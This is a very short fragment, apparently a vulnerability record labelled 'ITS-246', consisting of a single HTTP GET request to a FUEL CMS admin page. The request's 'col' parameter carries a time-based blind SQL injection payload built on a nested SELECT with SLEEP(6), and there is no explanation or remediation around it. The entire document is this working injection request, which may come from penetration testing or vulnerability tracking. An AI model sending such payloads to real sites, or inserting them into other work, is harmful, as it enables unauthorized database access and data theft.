# Vulnerable: ITS-246
GET /fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0
